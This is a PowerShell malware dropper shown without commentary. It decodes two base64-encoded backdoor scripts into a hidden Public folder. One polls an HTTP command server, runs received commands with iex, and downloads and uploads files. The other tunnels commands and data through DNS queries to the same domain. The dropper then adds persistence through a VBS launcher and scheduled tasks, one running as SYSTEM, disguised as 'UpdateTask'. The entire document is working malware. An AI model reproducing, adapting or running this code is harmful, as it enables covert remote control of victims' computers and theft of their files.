${global:$address1} = $env:PUBLIC + "\Public";
${global:$dns_ag} = "JENDQSA9ICJteWxlZnRoZWFydC5jb20iOw0KJEREQSA9IGdldC13bWlvYmplY3QgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWN0ICB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IFVVSUQgfCAleyAiYXRhZzEyIiArICRfLnJlcGxhY2UoJy0nLCcnKSB9fCAleyRfICsgIjEyMzQ1Njc4OTAifSB8ICV7JF8uc3Vic3RyaW5nKDAsMTApfQ0KDQpmdW5jdGlvbiBFRUEgKCRGRkEsICRHR0EsICRISEEsICRJSUEsICRKSkEpDQp7DQoJJEtLQSA9IC1qb2luICgoNDggLi4gNTcpKyg2NSAuLiA3MCkgfCBHZXQtUmFuZG9tICAtQ291bnQgKCV7IEdldC1SYW5kb20gLUlucHV0T2JqZWN0ICgxIC4uIDcpIH0pIHwgJXsgW2NoYXJdJF8gfSk7DQoJJExMQSA9IEdldC1SYW5kb20gLUlucHV0T2JqZWN0ICgwIC4uIDkpIC1Db3VudCAyOw0KCSRNTUEgPSAkRERBLkluc2VydCgoJExMQVsxXSksICRHR0EpLkluc2VydCgkTExBWzBdLCAkRkZBKTsNCgl3cml0ZS1ob3N0ICREREE7DQoJaWYgKCRKSkEgLWVxICJzIikNCgl7IHJldHVybiAiJCgkTU1BKSQoJEtLQSlBJCgkTExBWzBdKSQoJExMQVsxXSk3LiRISEEuJElJQS4kQ0NBIjsgfQ0KCWVsc2UgDQoJeyByZXR1cm4gIiQoJE1NQSkkKCRLS0EpQSQoJExMQVswXSkkKCRMTEFbMV0pNy4kKCRDQ0EpIjt9DQp9DQpmdW5jdGlvbiByZWNlaXZlDQp7DQoJJE5OQSA9ICRmYWxzZTsNCgkkT09BID0gMDsNCgkkUFBBID0gJHtnbG9iYWw6JFFRQX0gKyAiXCI7DQoJJFJSQSA9IEAoKTsNCgkkU1NBID0gIjAwMCI7DQoJJFRUQSA9ICIwIjsNCgkke2dsb2JhbDokVVVBfSA9ICR0cnVlOw0KCQ0KCSR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAwOw0KCSR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRfbGltaXRzc3N9ID0gMjsNCgkNCglXaGlsZSAoJHtnbG9iYWw6JFVVQX0pDQoJew0KCQlpZiAoJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSAtZ3QgJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudF9saW1pdHNzc30pIHsgYnJlYWsgfQ0KCQlTdGFydC1TbGVlcCAtbSAxMDA7DQoJCWlmICgkT09BIC1sdCAxMCkgeyAkU1NBID0gIjAwJCgkT09BKSI7IH0NCgkJZWxzZWlmICgkT09BIC1sdCAxMDApIHsgJFNTQSA9ICIwJCgkT09BKSI7IH0NCgkJZWxzZSB7ICRTU0EgPSAiJCgkT09BKSI7IH0NCgkJJFZWQSA9IEVFQSAkU1NBICRUVEEgIiIgIiIgInIiDQoJCXRyeQ0KCQl7DQoJCQlXcml0ZS1Ib3N0ICRWVkE7DQoJCQkkV1dBID0gW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3NlcygkVlZBKTsNCgkJCVdyaXRlLUhvc3QgJFdXQTsNCgkJfQ0KCQljYXRjaCBbRXhjZXB0aW9uXQ0KCQl7DQoJCQllY2hvICRfLkV4Y2VwdGlvbi5HZXRUeXBlKCkuRnVsbE5hbWUsICRfLkV4Y2VwdGlvbi5NZXNzYWdlOyBXcml0ZS1Ib3N0ICJleGNlcHRvbiBvY2N1cmVkISI7ICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ICsgMTsgY29udGludWU7DQoJCX0NCgkJDQoJCWlmICgkV1dBIC1lcSAkbnVsbCkNCgkJew0KCQkJJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSA9ICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gKyAxOw0KCQkJY29udGludWU7DQoJCX0NCgkJJFhYQSA9ICRXV0FbMF0uSVBBZGRyZXNzVG9TdHJpbmcuU3BsaXQoJy4nKTsNCgkJV3JpdGUtSG9zdCAiJCgkT09BKTokKCRYWEFbM10pYHRzYXZlaW5nX21vZGU6ICQoJE5OQSlgdCAgICQoJFhYQVswXSkgJCgkWFhBWzFdKSAkKCRYWEFbMl0pIg0KCQkNCgkJaWYgKCgkWFhBWzBdIC1lcSAxKSAtYW5kICgkWFhBWzFdIC1lcSAyKSAtYW5kICgkWFhBWzJdIC1lcSAzKSkNCgkJew0KCQkJJE5OQSA9ICRmYWxzZTsNCgkJCSRUVEEgPSAiMCI7DQoJCQkkbGVuID0gJFJSQS5MZW5ndGgNCgkJCWlmICgkUlJBWyRsZW4tMV0gLWVxIDAgLWFuZCAkUlJBWyRsZW4tMl0gLWVxIDApDQoJCQl7DQoJCQkJJFlZQSA9ICRSUkFbMCAuLiAoJGxlbiAtIDMpXTsNCgkJCX0NCgkJCWVsc2VpZiAoJFJSQVskbGVuIC0gMV0gLWVxIDApDQoJCQl7DQoJCQkJJFlZQSA9ICRSUkFbMCAuLiAoJGxlbiAtIDIpXTsNCgkJCX0NCgkJCWVsc2UNCgkJCXsNCgkJCQkkWVlBID0gJFJSQTsNCgkJCX0NCgkJCVtTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJFBQQSwgJFlZQSk7DQoJCQkkUlJBID0gQCgpOw0KCQkJJFlZQSA9IEAoKTsNCgkJCSRPT0EgPSAwOw0KCQkJJHtnbG9iYWw6JFVVQX0gPSAkZmFsc2U7DQoJCX0NCgkJDQoJCWlmICgkTk5BKQ0KCQl7DQoJCQlpZiAoJE9PQSAtZ3QgMjUwKSB7ICRPT0EgPSAwOyB9DQoJCQlpZiAoJE9PQSAtZXEgJFhYQVszXSkNCgkJCXsNCgkJCQkkUlJBICs9ICRYWEFbMF07DQoJCQkJJFJSQSArPSAkWFhBWzFdOw0KCQkJCSRSUkEgKz0gJFhYQVsyXTsNCgkJCQkkT09BID0gJE9PQSArIDM7DQoJCQl9DQoJCX0NCgkJDQoJCWlmICgoJFhYQVswXSAtZXEgMjQpIC1hbmQgKCRYWEFbMV0gLWVxIDEyNSkpDQoJCXsNCgkJCSRQUEEgKz0gJFhYQVsyXSArICIiICsgJFhYQVszXTsNCgkJCSROTkEgPSAkdHJ1ZTsNCgkJCSRUVEEgPSAiMSI7DQoJCQkkT09BID0gMDsNCgkJfQ0KCQkNCgkJaWYgKCgkWFhBWzBdIC1lcSAxMSkgLWFuZCAoJFhYQVsxXSAtZXEgMjQpIC1hbmQgKCRYWEFbMl0gLWVxIDIzNykgLWFuZCAoJFhYQVszXSAtZXEgMTEwKSkgIyBraWxsIHRoaXMgcHJvY2Vzcw0KCQl7DQoJCQkke2dsb2JhbDokVVVBfSA9ICRmYWxzZTsNCgkJCSR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gPSAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ICsgMTsNCgkJfQ0KCX0NCglTdGFydC1TbGVlcCAtcyAxOw0KfQ0KDQoNCg0KDQpmdW5jdGlvbiBzZW5kDQp7DQoJJE9PQSA9IDA7DQoJJFpaQSA9IEAoR2V0LUNoaWxkSXRlbSAtUGF0aCAke2dsb2JhbDokQUFCfSB8IFdoZXJlLU9iamVjdCB7ICEkXy5QU0lzQ29udGFpbmVyIH0pOw0KCWlmICgkWlpBIC1uZSAkbnVsbCkNCgl7DQoJCSRCQkIgPSAke2dsb2JhbDokQUFCfSArICJcIiArICRaWkFbMF07DQoJCSRDQ0IgPSBzbGFiZXIgJEJCQjsNCgkJaWYgKFtpbnRdJENDQi5MZW5ndGggLWxlIDApDQoJCXsNCgkJCVJlbW92ZS1JdGVtIC1QYXRoICRCQkI7DQoJCQlyZXR1cm47DQoJCX0NCgkJJEREQiA9IDYwOw0KCQkkRUVCID0gIioiICogNTQ7DQoJCSRFRUIgPSBTcGxpdC1QYXRoICRCQkIgLUxlYWYgfCAlIHsgJEVFQi5JbnNlcnQoMCwgJF8pIH0gfCAlIHsgJF8uSW5zZXJ0KDYsICRDQ0IuTGVuZ3RoKSB9IHwgJXskX1swLi4yNl0gLWpvaW4gIiJ9Ow0KCQkkRUVCID0gLWpvaW4gKCRFRUIgfCAlIHsgcmVzb2x2ZXIgJF8gfSkNCgkJJEZGQiA9ICJiV1YwWVQiICsgJEVFQjsNCgkJJENDQiA9ICRGRkIgKyAkQ0NCOw0KCQkkR0dCID0gIjAwMCI7DQoJCSRUVEEgPSAiMiI7DQoJCSRISEIgPSAwOw0KCQkke2dsb2JhbDokVVVBfSA9ICR0cnVlOw0KCQkNCgkJJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSA9IDA7DQoJCSR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRfbGltaXRzc3N9ID0gMjsNCgkJDQoJCVdoaWxlICgke2dsb2JhbDokVVVBfSkNCgkJew0KCQkJaWYgKCR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRlcnNzc30gLWd0ICR7Z2xvYmFsOiRleGNlcHRpb25fY291bnRfbGltaXRzc3N9KSB7IGJyZWFrOyB9DQoJCQlTdGFydC1TbGVlcCAtbSAxMDA7DQoJCQlpZiAoJE9PQSAtZXEgMjUwKSB7ICRPT0EgPSAwOyAkSEhCICs9IDI1MDsgfQ0KCQkJaWYgKCRPT0EgLWx0IDEwKSB7ICRHR0IgPSAiMDAkKCRPT0EpIjsgfQ0KCQkJZWxzZWlmICgkT09BIC1sdCAxMDApIHsgJEdHQiA9ICIwJCgkT09BKSI7IH0NCgkJCWVsc2UgeyAkR0dCID0gIiQoJE9PQSkiOyB9DQoJCQkNCgkJCWlmICgkQ0NCLkxlbmd0aCAtZ3QgJEREQikNCgkJCXsNCgkJCQlpZiAoKCRDQ0IuTGVuZ3RoIC0gJEREQiAqICgkT09BICsgJEhIQikpIC1nZSAkRERCKQ0KCQkJCXsNCgkJCQkJJElJQiA9ICRDQ0IuU3Vic3RyaW5nKCREREIgKiAoJE9PQSArICRISEIpLCAkRERCKTsNCgkJCQl9DQoJCQkJZWxzZWlmICgoJENDQi5MZW5ndGggLSAkRERCICogKCRPT0EgKyAkSEhCKSkgLWd0IDApDQoJCQkJew0KCQkJCQkkSUlCID0gJENDQi5TdWJzdHJpbmcoJEREQiAqICgkT09BICsgJEhIQiksICgkQ0NCLkxlbmd0aCAtICREREIgKiAoJE9PQSArICRISEIpKSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCSRJSUIgPSAiYldWMFlUWlc1ayI7DQoJCQkJCSR7Z2xvYmFsOiRVVUF9ID0gJGZhbHNlOw0KCQkJCQlSZW1vdmUtSXRlbSAtcGF0aCAkQkJCIC1Gb3JjZTsNCgkJCQl9DQoJCQl9DQoJCQllbHNlDQoJCQl7DQoJCQkJJElJQiA9ICRDQ0I7DQoJCQl9DQoJCQkkSkpCID0gKFNwbGl0LVBhdGggJEJCQiAtTGVhZikgKyAiKiIgfCAlIHsgcmVzb2x2ZXIgJF8gfTsNCgkJCSRWVkEgPSBFRUEgJEdHQiAkVFRBICRJSUIgJEpKQiAicyINCgkJCVdyaXRlLUhvc3QgIiQoJElJQilgdCQoJFZWQSkiDQoJCQl0cnkNCgkJCXsNCgkJCQkkV1dBID0gW1N5c3RlbS5OZXQuRG5zXTo6R2V0SG9zdEFkZHJlc3NlcygkVlZBKTsNCgkJCX0NCgkJCWNhdGNoIHsgV3JpdGUtSG9zdCAiZXhjZXB0b24gb2NjdXJlZCEiOyAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ID0gJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSArIDE7IGNvbnRpbnVlOyB9DQoJCQkNCgkJCWlmICgkV1dBIC1lcSAkbnVsbCkgeyAke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ID0gJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSArIDE7Y29udGludWUgfQ0KCQkJJFhYQSA9ICRXV0FbMF0uSVBBZGRyZXNzVG9TdHJpbmcuU3BsaXQoJy4nKTsNCgkJCVdyaXRlLUhvc3QgIiQoJE9PQSk6JCgkWFhBWzNdKWB0c2F2ZWluZ19tb2RlOiAkKCROTkEpYHQgICAkKCRYWEFbMF0pICQoJFhYQVsxXSkgJCgkWFhBWzJdKSINCgkJCQ0KCQkJaWYgKCgkWFhBWzBdIC1lcSAxKSAtYW5kICgkWFhBWzFdIC1lcSAyKSAtYW5kICgkWFhBWzJdIC1lcSAzKSkNCgkJCXsNCgkJCQkkT09BID0gW2ludF0kWFhBWzNdOw0KCQkJfQ0KCQkJDQoJCQlpZiAoKCRYWEFbMF0gLWVxIDExKSAtYW5kICgkWFhBWzFdIC1lcSAyNCkgLWFuZCAoJFhYQVsyXSAtZXEgMjM3KSAtYW5kICgkWFhBWzNdIC1lcSAxMTApKSAjIGtpbGwgdGhpcyBwcm9jZXNzDQoJCQl7DQoJCQkJJEhIQiA9IDANCgkJCQkke2dsb2JhbDokVVVBfSA9ICRmYWxzZTsNCgkJCQkke2dsb2JhbDokZXhjZXB0aW9uX2NvdW50ZXJzc3N9ID0gJHtnbG9iYWw6JGV4Y2VwdGlvbl9jb3VudGVyc3NzfSArIDM7DQoJCQkJZGVsICRCQkI7DQoJCQl9DQoJCX0NCgl9DQp9DQpmdW5jdGlvbiBzbGFiZXIgKCRLS0IpIHsNCglpZiAoKEdldC1JdGVtICRLS0IpLmxlbmd0aCAtZ3QgNjAwa2IpDQoJew0KCQkicmVzdWx0IHNpemUgZXhjZWVkZWQgdGhlIG1heGltdW0gc2l6ZSBhbmQgaXQgZGVsZXRlZCIgfCBTZXQtQ29udGVudCAkS0tCOw0KCX0NCgkkZiA9IEdldC1Db250ZW50ICRLS0IgLUVuY29kaW5nIEJ5dGU7DQoJJGUgPSByZXNvbHZlcigkZik7DQoJcmV0dXJuICRlOw0KfQ0KZnVuY3Rpb24gcmVzb2x2ZXIgKCRMTEIpIHsNCgkkY250ID0gMDsNCgkkcDEgPSAiIjsNCgkkcDIgPSAiIjsNCglmb3IgKCRpID0gMDsgJGkgLWx0ICRMTEIuTGVuZ3RoOyAkaSsrKQ0KCXsNCgkJaWYgKCRjbnQgLWVxIDMwKQ0KCQl7DQoJCQkkY250ID0gMDsNCgkJCSRyZXMgKz0gKCRwMSArICRwMik7DQoJCQkkcDEgPSAiIjsgJHAyID0gIiI7DQoJCX0NCgkJJHRtcCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJExMQlskaV0pLlJlcGxhY2UoIi0iLCAiIik7DQoJCSRwMSArPSAkdG1wWzBdOw0KCQkkcDIgKz0gJHRtcFsxXTsNCgkJJGNudCsrOw0KCX0NCgkkcmVzICs9ICgkcDEgKyAkcDIpOw0KCXJldHVybiAkcmVzOw0KfQ0KZnVuY3Rpb24gcHJvY2Vzc29yDQp7DQoJJFpaQSA9IEAoR2V0LUNoaWxkSXRlbSAtUGF0aCAke2dsb2JhbDokUVFBfSB8IFdoZXJlLU9iamVjdCB7ICEkXy5QU0lzQ29udGFpbmVyIH0pOw0KCWlmICgkWlpBIC1uZSAkbnVsbCkNCgl7DQoJCSRCQkIgPSAke2dsb2JhbDokUVFBfSArICJcIiArICRaWkFbMF07DQoJCSRNTUIgPSAkQkJCIC1yZXBsYWNlICJyZWNlaXZlYm94IiwgInNlbmRib3giOw0KCQkNCgkJaWYgKCRCQkIuRW5kc1dpdGgoIjAiKSkNCgkJew0KCQkJJE5OQiA9IEdldC1Db250ZW50ICRCQkIgfCA/IHsgJF8udHJpbSgpIC1uZSAiIiB9Ow0KCQkJJE9PQiA9ICR7Z2xvYmFsOiRBQUJ9ICsgIlwiICsgJFpaQVswXTsNCgkJCSROTkIgPSAkTk5CIHwgPyB7ICRfLnRyaW0oKSAtbmUgIiIgfQ0KCQkJJFBQQiArPSAkTk5CKyJcbiI7DQoJCQkkUFBCICs9ICROTkIuU3BsaXQoIiYiKSB8IGZvcmVhY2gtb2JqZWN0IHsgVHJ5IHsgJF8gfCBpZXggfCBPdXQtU3RyaW5nIH0gQ2F0Y2ggeyAkXyB8IE91dC1TdHJpbmd9IH0NCgkJCSRQUEIgKyI8PiIgfCBTZXQtQ29udGVudCAkT09CIC1FbmNvZGluZyBVVEY4DQoJCQlpZiAoVGVzdC1QYXRoIC1QYXRoICRCQkIpDQoJCQl7DQoJCQkJUmVtb3ZlLUl0ZW0gLXBhdGggJEJCQjsNCgkJCX0NCgkJfQ0KCQllbHNlaWYgKCRCQkIuRW5kc1dpdGgoIjEiKSkNCgkJew0KCQkJJFFRQiA9IEdldC1Db250ZW50ICRCQkIgfCA/IHsgJF8udHJpbSgpIC1uZSAiIiB9IHwgJXsgJF8uUmVwbGFjZSgiYDAiLCAiIikuVHJpbSgpIH0NCgkJCWlmIChUZXN0LVBhdGggLVBhdGggJFFRQikNCgkJCXsNCgkJCQkkT09CID0gJHtnbG9iYWw6JEFBQn0gKyAiXCIgKyAkWlpBWzBdOw0KCQkJCUNvcHktSXRlbSAtcGF0aCAkUVFCIC1kZXN0aW5hdGlvbiAkT09CIC1Gb3JjZTsNCgkJCX0NCgkJCWVsc2UNCgkJCXsNCgkJCQkiRmlsZSBub3QgZXhpc3QiIHwgU2V0LUNvbnRlbnQgJE1NQjsNCgkJCX0NCgkJCWlmIChUZXN0LVBhdGggLVBhdGggJEJCQikNCgkJCXsNCgkJCQlSZW1vdmUtSXRlbSAtcGF0aCAkQkJCOw0KCQkJfQ0KCQl9DQoJCWVsc2VpZiAoJEJCQi5FbmRzV2l0aCgiMiIpKQ0KCQl7DQoJCQkkUlJCID0gJEJCQiAtcmVwbGFjZSAicmVjZWl2ZWJveCIsICJkb25lIjsNCgkJCU1vdmUtSXRlbSAtcGF0aCAkQkJCIC1kZXN0aW5hdGlvbiAkUlJCIC1Gb3JjZTsNCgkJCWlmIChUZXN0LVBhdGggLVBhdGggJFJSQikNCgkJCXsNCgkJCQkoIjIwMDw+IiArICRSUkIpIHwgU2V0LUNvbnRlbnQgJE1NQjsNCgkJCQlSZW1vdmUtSXRlbSAtcGF0aCAkQkJCOw0KCQkJfQ0KCQl9DQoJfQ0KfQ0KDQoke2dsb2JhbDokU1NCfSA9ICRlbnY6UFVCTElDICsgIlxQdWJsaWNcIisgJEREQTsNCiR7Z2xvYmFsOiRRUUF9ID0gJHtnbG9iYWw6JFNTQn0gKyAiXHJlY2VpdmVib3giOw0KJHtnbG9iYWw6JEFBQn0gPSAke2dsb2JhbDokU1NCfSArICJcc2VuZGJveCI7DQoke2dsb2JhbDokVFRCfSA9ICR7Z2xvYmFsOiRTU0J9ICsgIlxkb25lIjsNCmlmICgtbm90IChUZXN0LVBhdGggLVBhdGggJHtnbG9iYWw6JFNTQn0pIC1vciAtbm90IChUZXN0LVBhdGggLVBhdGggJHtnbG9iYWw6JEFBQn0pKQ0Kew0KCW1kICR7Z2xvYmFsOiRTU0J9Ow0KCW1kICR7Z2xvYmFsOiRBQUJ9Ow0KCW1kICR7Z2xvYmFsOiRRUUF9Ow0KCW1kICR7Z2xvYmFsOiRUVEJ9Ow0KfQ0KcmVjZWl2ZTsNCnByb2Nlc3NvcjsNCnNlbmQ7";
${global:$http_ag} = "JEJCQSA9ICJodHRwOi8vIiArIFtTeXN0ZW0uTmV0LkRuc106OkdldEhvc3RBZGRyZXNzZXMoIm15bGVmdGhlYXJ0LmNvbSIpDQoke2dsb2JhbDokQ0NBfSA9IG5ldy1vYmplY3Qgc3lzdGVtLm5ldC5XZWJDbGllbnQNCiR0ID0gZ2V0LXdtaW9iamVjdCBXaW4zMl9Db21wdXRlclN5c3RlbVByb2R1Y3QgIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgVVVJRA0KJEREQSA9ICR0IHwgJXsiYXRhZzEyIiArICRfLlJlcGxhY2UoJy0nLCAnJykgKyAiMTIzNDU2Nzg5MCJ9IHwgJXskXy5zdWJzdHJpbmcoMCwxMCl9DQokRUVBID0gJGVudjpQVUJMSUMrIlxQdWJsaWNcZmlsZXNcIjsNCmlmKC1ub3QoVGVzdC1QYXRoICRFRUEpKSB7bWQgJEVFQX0NCiRGRkEgPSAkRUVBKyJjZmcuaW5pIjsNCmlmKFRlc3QtUGF0aCAkRkZBKSB7DQoJJGxzID0gR2V0LUNvbnRlbnQgICRGRkEgfCBXaGVyZSB7ICRfIC1ub3RtYXRjaCAnXlxzKyQnIH0NCglmb3JlYWNoICgkbCBpbiAkbHMpDQoJew0KCQkkR0dBID0gJGwgLXNwbGl0ICcsJw0KCQlpZigkR0dBWzBdIC1lcSAic3J2Iil7JEhIQSA9ICRHR0FbMV0gKyAiIjt9DQoJCWlmKCRHR0FbMF0gLWVxICJ1c3IiKXskSUlBID0gJEdHQVsxXSArICIiO30NCgkJaWYoJEdHQVswXSAtZXEgInBhcyIpeyRKSkEgPSAkR0dBWzFdICsgIiI7fQ0KCQlpZigkR0dBWzBdIC1lcSAicHJ0Iil7JEtLQSA9ICRHR0FbMV0gKyAiIjt9DQoJCWlmKCRHR0FbMF0gLWVxICJkb20iKXskTExBID0gJEdHQVsxXSArICIiO30NCgl9DQoJJHUgPSAiaHR0cDovLyIgKyAkSEhBICsgIjoiICsgJEtLQTsNCgkkTU1BID0gbmV3LW9iamVjdCBTeXN0ZW0uTmV0LldlYlByb3h5KCR1LCAkdHJ1ZSk7DQoJJE5OQSA9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5OZXR3b3JrQ3JlZGVudGlhbCgkSUlBLCAkSkpBLCAkTExBKQ0KCSRNTUEuY3JlZGVudGlhbHMgPSAkTk5BDQoJJHtnbG9iYWw6JENDQX0ucHJveHkgPSAkTU1BOw0KfSBlbHNlIHske2dsb2JhbDokQ0NBfS5wcm94eSA9IFtTeXN0ZW0uTmV0LldlYlByb3h5XTo6R2V0RGVmYXVsdFByb3h5KCl9DQokciA9ICR0cnVlOw0Kd2hpbGUoJHIpIHsNCgkkciA9ICRmYWxzZTsNCgkkT09BID0gLWpvaW4gKEdldC1SYW5kb20gLUlucHV0T2JqZWN0ICgwIC4uIDkpIC1Db3VudCAoJXtHZXQtUmFuZG9tIC1JbnB1dE9iamVjdCAoMS4uOSl9KSkNCgkkUFBBID0gJEREQS5JbnNlcnQoNSwgJE9PQSkNCgkkUVFBID0gJHtnbG9iYWw6JENDQX0uRG93bmxvYWRTdHJpbmcoIiQoJEJCQSkvY28vJCgkUFBBKSIpDQoJd3JpdGUtaG9zdCAkUVFBDQoJJFJSQSA9ICIiDQoJaWYgKCRRUUEpIHsNCgkJJFNTQSA9ICRRUUEuc3BsaXQoIjw+IikgfCB3aGVyZSB7JF99DQoJCSRUVEEgPSAkU1NBWzBdOw0KCQkkcCA9ICRFRUErIiRUVEEiDQoJCWlmKCRTU0EubGVuZ3RoIC1ndCA0KSB7DQoJCQl3cml0ZS1ob3N0ICRTU0FbMV0NCgkJCWlmICgkU1NBWzJdIC1uZSAibm90IiAtYW5kICRTU0FbMl0pew0KCQkJCXdyaXRlLWhvc3QgJFNTQVsyXTsNCgkJCQkke2dsb2JhbDokQ0NBfS5Eb3dubG9hZEZpbGUoIiRCQkEvZmlsLyIrJFNTQVszXSwgJEVFQSskU1NBWzJdKTsNCgkJCQkiRmlsZSBzYXZlZCBpbiAiKyRFRUErJFNTQVsyXSB8IEFkZC1Db250ZW50ICRwDQoJCQl9DQoJCQlpZiAoJFNTQVsxXSAtbmUgIm5vdCIgLWFuZCAkU1NBWzFdKXsNCgkJCQkkUlJBICs9ICRTU0FbMV0rIjxici8+Ig0KCQkJCSRyY250ID0gJFNTQVsxXSB8ID8geyAkXy50cmltKCkgLW5lICIiIH0NCgkJCQkkUlJBICs9ICRyY250LlNwbGl0KCImIikgfCBmb3JlYWNoLW9iamVjdCB7IFRyeSB7ICRfIHwgaWV4IHwgT3V0LVN0cmluZyB9IENhdGNoIHsgJF8gfCBPdXQtU3RyaW5nfSB9DQoJCQkJJFJSQSsiPD4iIHwgU2V0LUNvbnRlbnQgJHANCgkJCQkjJHtnbG9iYWw6JENDQX0uVXBsb2FkU3RyaW5nKCIkQkJBL3Jlcy8kUFBBJFRUQSIsICRSUkEpOw0KCQkJfQ0KCQkJaWYgKCRTU0FbNF0gLW5lICJub3QiIC1hbmQgJFNTQVs0XSl7DQoJCQkJd3JpdGUtaG9zdCAkU1NBWzRdDQoJCQkJaWYoVGVzdC1QYXRoICRTU0FbNF0pIHsNCgkJCQkJJHtnbG9iYWw6JENDQX0uVXBsb2FkRmlsZSgiJEJCQS9maWwvJFBQQSRUVEEiLCAkU1NBWzRdKTsNCgkJCQkJInVwbDw+IiskU1NBWzRdIHwgQWRkLUNvbnRlbnQgJHANCgkJCQl9DQoJCQl9DQoJCQlpZigkU1NBWyRTU0EubGVuZ3RoIC0xXSAtZXEgIjEiKSB7DQoJCQkJJHIgPSAkdHJ1ZTsNCgkJCX0NCgkJCWlmKCRUVEEgLW5lICJub3QiIC1hbmQgJFRUQSkgew0KCQkJCSR7Z2xvYmFsOiRDQ0F9LlVwbG9hZEZpbGUoIiRCQkEvcmVzLyRQUEEkVFRBIiwgJHApOw0KCQkJCVJlbW92ZS1JdGVtICRwIC1Gb3JjZQ0KCQkJfQ0KCQl9DQoJfQ0KfQ==";

if (-not (Test-Path -Path ${global:$address1}))
{md ${global:$address1}; Get-Item ${global:$address1} -Force | %{$_.attributes = "Hidden"}}
if (Test-Path -Path ${global:$address1})
{
	[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([string]${global:$http_ag})) | Set-Content "${global:$address1}\hUpdater.ps1";
	[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([string]${global:$dns_ag})) | Set-Content "${global:$address1}\dUpdater.ps1";
	"command0 = `"Powershell.exe -exec bypass -file ${global:$address1}\hUpdater.ps1`"`nset Shell0 = CreateObject(`"wscript.shell`")`nshell0.run command0, 0, false`ncommand1 = `"Powershell.exe -exec bypass -file ${global:$address1}\dUpdater.ps1`"`nset Shell1 = CreateObject(`"wscript.shell`")`nshell1.run command1, 0, false" | Out-File "${global:$address1}\UpdateTask.vbs"
	schtasks /create /F /sc minute /mo 10 /tn "\UpdateTasks\UpdateTask" /tr "wscript /b \`"${global:$address1}\UpdateTask.vbs\`"";
	schtasks /create /F /ru SYSTEM /sc minute /mo 10 /tn "\UpdateTasks\UpdateTaskHosts" /tr "wscript /b \`"${global:$address1}\UpdateTask.vbs\`"";
}
